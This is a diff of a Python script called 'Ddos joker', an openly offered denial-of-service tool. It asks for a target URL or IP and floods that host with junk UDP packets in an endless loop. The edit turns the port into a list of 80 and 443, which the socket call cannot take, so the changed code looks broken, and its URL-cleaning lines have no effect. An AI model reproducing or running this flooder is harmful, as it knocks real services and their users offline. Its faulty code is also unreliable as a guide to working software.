@@ -7,17 +7,18 @@ os.system("pkg install toilet -y ")
 os.system("pkg install figlet -y ")
 os.system("clear")
 os.system("toilet -f mono12 -F gay DDOS")
-print(f"{green}==================================")
+print(f"{green}========================")
 print(" Ddos joker")
-
-print( "   =====================================")
+print("===========================")
+time.sleep(3)
+os.system("clear")
 print()
 target = input(f"{green} Enter Target URL/IP: =>")
 target.replace("http://", "")
 target.replace("https://","")
 target.replace("www.","")
 ip = socket.gethostbyname(target)
-port = 80
+port = [ 80, 443]
 joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"
 os.system("clear")
 os.system("toilet -f mono12 LOADING | lolcat")
@@ -35,4 +36,4 @@ os.system("figlet Attack_Starting")
 while True:
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      sock.sendto(bytes(joker,"UTF-8"), (ip,port))
-     print(port,"<===send packet to ===>",ip)
+     print(port,"<== packet ==>",ip)
